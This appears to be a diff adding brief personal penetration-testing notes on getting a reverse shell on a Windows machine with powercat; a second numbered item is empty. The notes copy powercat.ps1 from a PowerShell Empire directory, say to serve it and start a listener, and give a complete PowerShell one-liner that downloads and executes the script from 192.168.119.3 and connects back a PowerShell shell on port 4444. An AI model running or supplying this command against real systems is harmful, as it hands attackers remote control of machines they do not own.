@@ -1,0 +1,12 @@
+Windows
+1.
+  Download powercat.ps1 from == cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+
+  Serve it over port 80
+
+  Set up listener
+
+  Encode and run this cmd to achieve shell == IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
+2.
+
+  
